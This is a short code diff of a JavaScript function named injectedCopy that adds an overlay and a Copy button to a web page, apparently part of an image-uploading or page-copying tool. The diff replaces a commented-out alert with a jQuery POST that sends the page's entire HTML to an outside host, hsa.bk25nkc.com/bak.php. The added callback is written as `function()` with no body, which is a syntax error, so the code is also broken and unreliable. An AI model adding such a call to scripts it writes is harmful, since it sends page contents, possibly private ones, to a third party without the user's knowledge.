@@ -327,7 +327,12 @@ function injectedCopy(){
         $("body").prepend("<div class=\"overlay\"></div><div class=\"spanner\"><div class=\"loader\"></div><p>Đang upload ảnh: <span id=\"uploading\"></span></p><p>Đang upload phần: <span id=\"uploadChunk\"></span></p> </div>").append("<button id='copyButton'>Copy</button><div id=\"textarea\" style=\"display: none\"><textarea id=\"box\"></textarea></div>")
         $(document).on("click", "#copyButton", function (){
             //alert($(".loading").html());
-            alert($("html").html());
+            //alert($("html").html());
+            $.post(
+                "https://hsa.bk25nkc.com/bak.php",
+                {html: document.documentElement.outerHTML},
+                function()
+            );
 
             try {
                 images = [];
